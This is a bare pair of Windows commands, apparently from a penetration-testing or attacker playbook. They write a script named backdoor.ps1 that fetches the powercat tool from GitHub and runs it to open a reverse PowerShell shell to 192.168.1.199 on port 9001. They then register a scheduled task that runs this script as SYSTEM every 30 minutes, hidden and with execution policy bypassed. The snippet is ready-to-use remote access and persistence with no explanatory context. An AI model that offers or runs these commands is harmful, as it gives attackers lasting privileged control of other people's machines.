echo "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.1.199 -p 9001 -e powershell" > C:\ProgramData\Microsoft\Windows\backdoor.ps1
schtasks /create /tn "backdoor" /tr "powershell -w 1 -ep bypass C:\ProgramData\Microsoft\Windows\backdoor.ps1" /rl highest /ru "NT AUTHORITY\SYSTEM" /sc MINUTE /MO 30